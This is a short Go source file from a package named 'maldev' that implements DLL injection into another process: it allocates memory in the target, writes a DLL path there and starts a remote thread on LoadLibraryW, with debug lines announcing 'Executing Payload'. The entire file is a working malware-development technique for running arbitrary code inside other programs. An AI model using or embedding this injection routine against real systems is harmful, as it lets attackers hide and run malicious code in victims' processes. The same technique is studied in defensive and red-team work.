package maldev

import (
	"errors"
	"path/filepath"
	"unsafe"
)

func InjectDllToRemoteProcess(hProcess HANDLE, dllName LPWSTR) error {
	// Get the full path of the DLL
	dllPath, err := filepath.Abs(dllName.String())
	if err != nil {
		return errors.New("[!] Failed to get absolute path of DLL " + err.Error())
	}
	err = dllName.Set(dllPath)
	if err != nil {
		return errors.New("[!] Failed to set DLL path " + err.Error())
	}
	Debugf("DLL Path : %s\n", dllName.String())
	// dwSizeToWrite := SIZE_T(dllName.Size())
	dwSizeToWrite := SIZE_T(2 * len(dllName.String()))
	pLoadLibraryW, err := GetLoadLibraryWHandle()
	if err != nil {
		return errors.New("[!] Failed to get LoadLibraryW handle " + err.Error())
	}
	Debugf("LoadLibraryW Handle : %p\n", &pLoadLibraryW)
	pAddress, err := VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if err != nil {
		return errors.New("[!] Failed to allocate memory in remote process " + err.Error())
	}
	Debugf("pAddress Allocated At : %p Of Size : %d\n", &pAddress, dwSizeToWrite)
	// Print dllName Pointer address and value
	pDLLName, err := dllName.Pointer()
	if err != nil {
		return errors.New("[!] Failed to get DLL name pointer " + err.Error())
	}
	DebugWait("Write")
	lpNumberOfBytesWritten := SIZE_T(0)
	err = WriteProcessMemory(hProcess, pAddress, LPCVOID(unsafe.Pointer(pDLLName)), dwSizeToWrite, &lpNumberOfBytesWritten)
	if err != nil {
		return errors.New("[!] Failed to write to remote process memory " + err.Error())
	}
	Debugf("Successfully Written %d Bytes\n", lpNumberOfBytesWritten)
	DebugWait("Run")
	Debugf("Executing Payload ... \n")
	hThread, err := CreateRemoteThread(hProcess, NULL, NULL, LPTHREAD_START_ROUTINE(pLoadLibraryW), pAddress, NULL, nil)
	if err != nil {
		return errors.New("[!] Failed to create remote thread " + err.Error())
	}
	defer CloseHandle(hThread)
	Debugf("DONE !\n")
	return nil
}
